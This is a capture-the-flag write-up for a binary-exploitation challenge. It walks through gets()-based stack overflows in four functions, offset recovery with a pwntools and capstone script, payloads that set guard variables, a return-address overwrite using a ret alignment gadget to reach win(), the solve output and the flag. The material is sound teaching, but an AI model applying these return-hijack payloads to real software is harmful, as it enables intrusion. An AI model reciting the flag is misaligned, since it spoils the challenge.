# Proper Pwning

> **Category**: Pwn
>
> **Flag**: `bronco{1m_th3_b35t_PWN3r_1n_th3_wh0l3_w1d3_w0r1d}`

> Have you read the Pwntorial? Ready to graduate from baby pwns?
>
> This should do it. Three gates and a treasure room await your input.
>
> `nc 0.cloud.chals.io 21543`

### Files

* `proper.c` — full challenge source (provided)
* `proper` — the challenge binary (provided)
* `Dockerfile` — how the server hosts it (provided)
* `recon.py` — pwntools+capstone script used to derive every offset below straight from the binary (no `objdump`/`gdb`/`readelf` needed)
* `exploit.py` — full remote solve script

### Tools

* Python 3 + [pwntools](https://docs.pwntools.com/) (`ELF()` for symbol lookup, `p32`/`p64` for packing, `remote()`/`process()` for I/O)
* [`capstone`](https://www.capstone-engine.org/) for disassembly (`objdump`/`gdb` were not installed in the environment this was solved in — `recon.py` does the same job purely in Python)

### Source review

The whole binary is one C file with a very readable structure:

```c
int gate1() {
    volatile int gate = CLOSED;   // CLOSED = 0
    int buffer[64];

    gets(buffer);
    if (gate == CLOSED) { ... return -1; }
    else                { ... return 1;  }
}

int gate2() {
    volatile int gate = CLOSED;
    volatile int baby_chicken = ALIVE;   // ALIVE = 41
    long buffer[64];

    gets(buffer);
    if (baby_chicken != ALIVE) { ... return -1; }  // must stay 41
    if (gate == CLOSED)        { ... return -1; }
    else                        { ... return 1;  }
}

int gate3() {
    volatile int gate = CLOSED;
    char buffer[67];

    gets(buffer);
    if      (gate == CLOSED)     return -1;
    else if (gate == 13371337)   { printf("... win() is that way, located at %p\n", win); return 1; }
    else                          return -1;
}

void treasure_room() {
    char buffer[6767];
    gets(buffer);
    printf("\nTREASURE?\n");
}

void win() {
    printf("...you're the greatest C pwner of all time...\n");
    system("/bin/cat flag.txt");
    exit(0);
}
```

The bug is blatant and repeated four times: **`gets()` on a fixed-size stack buffer**, with zero bounds checking, in every single function. `main()` calls `gate1()` → `gate2()` → `gate3()` → `treasure_room()` in sequence, bailing out early if any gate returns `-1`.

The build flags, given at the bottom of the source, remove every mitigation that would normally make this hard:

```
gcc proper.c -o proper -fno-stack-protector -z execstack -no-pie
```

| Mitigation            | Status                           | Consequence                                                                |
| --------------------- | -------------------------------- | -------------------------------------------------------------------------- |
| Stack canary          | **off** (`-fno-stack-protector`) | overflow straight through to saved RBP/RET with no crash-detection         |
| PIE                   | **off** (`-no-pie`)              | every function address (`win`, gadgets) is a fixed, known constant         |
| NX / executable stack | **off** (`-z execstack`)         | irrelevant here — we don't need shellcode, `win()` already does everything |

`gate3()` is even kind enough to **leak `win()`'s address for you** in its success message once `gate == 13371337`. With no PIE, we didn't strictly need that leak (the address is static and printed right there in the challenge's own hint text either way), but it's a nice confirmation that the intended path is exactly what it looks like.

### Deriving the exact offsets (`recon.py`)

Rather than eyeballing stack layouts, `recon.py` uses `pwntools.ELF()` for symbol addresses and `capstone` to disassemble each vulnerable function's prologue, so the buffer-to-saved-RBP distance falls straight out of the `sub rsp, N` / `lea rax, [rbp-M]` instructions:

```
$ python recon.py ./proper
=== symbols ===
win             0x40123b
gate1           0x4013be
gate2           0x40133c
gate3           0x4012b1
treasure_room   0x401270
main            0x40141b

---- gate1 ----
  0x4013c6  sub rsp, 0x110
  0x4013cd  mov dword ptr [rbp - 4], 0      ; gate = CLOSED, at rbp-4
  0x4013d4  lea rax, [rbp - 0x110]          ; buffer starts at rbp-0x110
  ...

---- gate2 ----
  0x401344  sub rsp, 0x210
  0x40134b  mov dword ptr [rbp - 4], 0      ; gate, at rbp-4
  0x401352  mov dword ptr [rbp - 8], 0x29   ; baby_chicken = 41, at rbp-8
  0x401359  lea rax, [rbp - 0x210]          ; buffer starts at rbp-0x210
  ...

---- gate3 ----
  0x4012b9  sub rsp, 0x50
  0x4012bd  mov dword ptr [rbp - 4], 0      ; gate, at rbp-4
  0x4012c4  lea rax, [rbp - 0x50]           ; buffer starts at rbp-0x50
  ...

---- treasure_room ----
  0x401278  sub rsp, 0x1000     ; stack probe (guard page touch for the huge frame)
  0x401284  sub rsp, 0xa70
  0x40128b  lea rax, [rbp - 0x1a70]         ; buffer starts at rbp-0x1a70
  ...
  0x4012af  leave
  0x4012b0  ret                              ; <- bare `ret`, reused as an alignment gadget

=== hunting a bare `ret` gadget near win() ===
ret gadget @ 0x4012b0
```

From these, the buffer→saved-RBP distances are immediate:

| Function        | `buffer` @   | Saved RBP @ | Distance to overflow up to (not past) RBP                                    |
| --------------- | ------------ | ----------- | ---------------------------------------------------------------------------- |
| `gate1`         | `rbp-0x110`  | `rbp`       | `0x110` bytes reaches `rbp-4` (`gate`) — pad `0x10c` bytes then write `gate` |
| `gate2`         | `rbp-0x210`  | `rbp`       | pad `0x208` to reach `baby_chicken` (`rbp-8`), then `gate` (`rbp-4`)         |
| `gate3`         | `rbp-0x50`   | `rbp`       | pad `0x4c` to reach `gate` (`rbp-4`)                                         |
| `treasure_room` | `rbp-0x1a70` | `rbp`       | pad `0x1a78` to reach the **saved return address** itself (`rbp+8`)          |

### Exploit plan

Each of the first three functions just needs its **local guard variable** flipped to the value it checks for — we're never touching the saved RBP/return address in those three, only writing up to (but not past) it, so each returns cleanly back into `main()`:

```python
# gate1(): int buffer[64] at rbp-0x110; gate sits right after at rbp-4.
g1 = b"A" * 0x10C + b"\x01\x01\x01\x01"

# gate2(): long buffer[64] at rbp-0x210; baby_chicken (must stay 41) at rbp-8, gate at rbp-4.
g2 = b"A" * 0x208 + p32(0x29) + b"\x01\x01\x01\x01"

# gate3(): char buffer[67] at rbp-0x50; gate must equal exactly 13371337.
g3 = b"A" * 0x4C + p32(13371337)
```

`treasure_room()` is where the real hijack happens — its buffer is _huge_ (`6767` bytes declared, `0x1a70` actual distance to RBP after alignment), so the overflow reaches all the way to the **saved return address**:

```python
WIN = 0x40123b          # from recon.py, no PIE means this never changes
tr = b"A" * 0x1A78 + p64(WIN)   # naive version — see alignment gotcha below
```

#### The one gotcha: stack alignment before `system()`

Jumping straight from `treasure_room`'s `ret` into `win()` leaves `rsp % 16 == 0` at the moment `win()`'s prologue runs, which is **one call frame short** of the 16-byte alignment `system()`/libc expect at their own entry (x86-64 SysV ABI guarantees `rsp % 16 == 0` _at the call site_, so callees expect `rsp % 16 == 8` right after their own `call` pushes a return address). Landing directly via a hijacked `ret` desyncs this by one `push`, and glibc's internal `movaps` (SSE aligned move) instructions **silently SIGSEGV** the very first time `win()`'s `system("/bin/cat flag.txt")` executes — no error printed, connection just dies.

Fix: bounce through one extra bare `ret` gadget first (`0x4012b0`, conveniently already sitting at the tail of `treasure_room()` itself) to eat one more return and shift the alignment back into what `win()` expects:

```python
RET = 0x4012b0                                # bare `ret`, found by recon.py
tr  = b"A" * 0x1A78 + p64(RET) + p64(WIN)      # ret-sled of one gadget, then win()
```

This is a completely generic technique — any `ret`-only (or `pop reg; ret`) gadget one byte into any executable code works as a "free" stack-alignment nudge whenever a ROP/ret hijack lands you one `push` off from what a called libc function expects.

### Running the exploit

```
$ python exploit.py
[*] win()        @ 0x40123b
[*] ret gadget   @ 0x4012b0

[+] Well done. Gate 1 opens.

[+] Well done. Gate 2 opens.

[+] Gate 3 opens, and you find some treasure. It says 'win() is that way, located at 0x40123b'

TREASURE?

[*] oh my goodness, you're the greatest C pwner of all time. yoshie bows down to your prowess.
bronco{1m_th3_b35t_PWN3r_1n_th3_wh0l3_w1d3_w0r1d}
```

`exploit.py` also supports `--local ./proper` to test the whole chain against a local copy of the binary (e.g. inside the provided Docker image) before firing at the remote.

### Flag

```
bronco{1m_th3_b35t_PWN3r_1n_th3_wh0l3_w1d3_w0r1d}
```

### Summary

| Gate            | Bug                                  | Fix applied by our payload                                      |
| --------------- | ------------------------------------ | --------------------------------------------------------------- |
| `gate1`         | `gets()` overflow, unchecked `gate`  | pad to `gate`'s offset, write nonzero                           |
| `gate2`         | `gets()` overflow, two guards        | preserve `baby_chicken == 41`, then set `gate` nonzero          |
| `gate3`         | `gets()` overflow, exact-value check | pad to `gate`, write `13371337` exactly                         |
| `treasure_room` | `gets()` overflow into saved RET     | overwrite RET with `ret`-gadget → `win()` for 16-byte alignment |

No canary to brute-force, no PIE to leak (this build has none), no ASLR to defeat for the binary's own code — the entire challenge is "read the source, get the offsets right, remember the alignment gotcha before calling into libc."
